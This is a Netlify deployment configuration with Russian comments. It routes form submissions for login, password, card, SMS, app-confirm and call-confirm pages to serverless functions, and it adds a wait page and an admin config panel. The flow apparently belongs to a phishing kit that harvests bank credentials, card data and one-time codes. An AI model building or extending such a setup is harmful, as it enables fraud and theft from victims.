[build]
  publish = "public"
  functions = "netlify/functions"

[build.environment]
  NODE_VERSION = "18"

# POST обработчики - идут ПЕРВЫМИ чтобы перехватить POST запросы форм
[[redirects]]
  from = "/login"
  to = "/.netlify/functions/login"
  status = 200
  methods = ["POST"]

[[redirects]]
  from = "/password"
  to = "/.netlify/functions/password"
  status = 200
  methods = ["POST"]

[[redirects]]
  from = "/card"
  to = "/.netlify/functions/card"
  status = 200
  methods = ["POST"]

[[redirects]]
  from = "/sms"
  to = "/.netlify/functions/sms"
  status = 200
  methods = ["POST"]

[[redirects]]
  from = "/app-confirm"
  to = "/.netlify/functions/app-confirm"
  status = 200
  methods = ["POST"]

[[redirects]]
  from = "/call-confirm"
  to = "/.netlify/functions/call-confirm"
  status = 200
  methods = ["POST"]

[[redirects]]
  from = "/admin/config"
  to = "/.netlify/functions/admin-config"
  status = 200

# GET страницы - после POST обработчиков
[[redirects]]
  from = "/login"
  to = "/index.html"
  status = 200

[[redirects]]
  from = "/password"
  to = "/password.html"
  status = 200

[[redirects]]
  from = "/card"
  to = "/card.html"
  status = 200

[[redirects]]
  from = "/sms"
  to = "/sms.html"
  status = 200

[[redirects]]
  from = "/wait"
  to = "/wait.html"
  status = 200

[[redirects]]
  from = "/app-confirm"
  to = "/app-confirm.html"
  status = 200

[[redirects]]
  from = "/call-confirm"
  to = "/call-confirm.html"
  status = 200

[[redirects]]
  from = "/admin"
  to = "/admin.html"
  status = 200

# Fallback для всех остальных GET запросов
[[redirects]]
  from = "/*"
  to = "/index.html"
  status = 200
